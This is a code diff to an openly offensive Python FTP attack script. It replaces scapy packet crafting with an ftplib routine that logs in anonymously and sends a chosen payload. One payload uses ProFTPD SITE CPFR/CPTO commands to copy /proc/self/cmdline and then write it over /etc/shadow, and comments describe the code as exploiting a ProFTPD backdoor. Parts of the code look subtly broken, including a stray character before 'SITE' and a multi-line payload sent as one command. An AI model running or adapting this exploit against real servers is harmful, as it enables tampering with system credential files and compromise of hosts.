@@ -1,5 +1,6 @@
 from scapy.all import *
 from scapy.layers.inet import IP, UDP, TCP, ICMP
+import ftplib
 
 
 def attack_to_perform(number):
@@ -87,7 +88,7 @@ def perform_ftp_attack():
     choice = input("Enter the number of the attack to perform: ")
 
     if choice == "1":
-        payload = b'USER anonymous:)\nPASS somepassword\n'
+        payload = "USER anonymous:)\nPASS somepassword\n"
         return exploit_ftp(fsIP, payload)
     elif choice == "2":
         payload = "sSITE CPFR /proc/self/cmdline\nSITE CPTO /tmp/cmdline\nSITE CPFR /tmp/cmdline\nSITE CPTO /etc/shadow\n"
@@ -135,10 +136,20 @@ Explanation:    This payload leverages the backdoor vulnerability in ProFTPD. It
 # The payload contains the malicious commands to exploit the backdoor.
 def exploit_ftp(ip_addr, payload):
     # Craft the malicious packet to exploit the backdoor vulnerability
-    packet = IP(dst=ip_addr) / TCP(dport=21, flags="PA") / payload
+    # packet = IP(dst=ip_addr) / TCP(dport=21, flags="PA") / payload
 
     # Send the malicious packet
-    send(packet)
+    # send(packet)
+
+    # Connect to the target FTP server
+    ftp = ftplib.FTP(ip_addr)
+    ftp.login()
+
+    # Send the malicious payload to the server
+    ftp.sendcmd(payload)
+
+    # Close the FTP connection
+    ftp.quit()
 
     return "Exploit packet sent."
 
